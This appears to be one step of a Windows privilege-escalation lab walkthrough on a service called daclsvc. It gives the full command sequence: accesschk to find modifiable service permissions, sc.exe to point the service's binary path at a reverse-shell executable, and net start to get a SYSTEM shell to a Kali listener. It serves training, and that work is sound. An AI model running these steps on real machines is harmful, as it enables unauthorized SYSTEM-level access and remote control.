# Task 3: Checking User Permissions on the **daclsvc** Service üîçüîë

---

## Description
In this task, you will use `accesschk.exe` to check the permissions of the **"user"** account on the **"daclsvc"** service.

---

### Checking Permissions:
1. Run the following command:  
   `"C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc"`  
   This will reveal that the **"user"** account has permission to modify the service configuration (SERVICE_CHANGE_CONFIG). ‚öôÔ∏è

---

### Querying Service Information:
2. Query the service information to confirm that it runs with SYSTEM privileges (SERVICE_START_NAME):  
   `"sc.exe qc daclsvc"`

---

### Modifying Service Configuration:
3. Change the service configuration by setting the `BINARY_PATH_NAME` (binpath) to the `reverse.exe` executable you created earlier:  
   `sc.exe config daclsvc binpath= "C:\PrivEsc\reverse.exe"`

---

### Triggering the Reverse Shell:
4. Set up a listener on Kali, and then start the service to trigger the reverse shell with SYSTEM privileges:  
   `"net start daclsvc"`

---

### Important! ‚ö†Ô∏è
These steps demonstrate how to gain privileged shells by exploiting misconfigurations in service permissions. Always exercise caution when working with system privileges! üîí
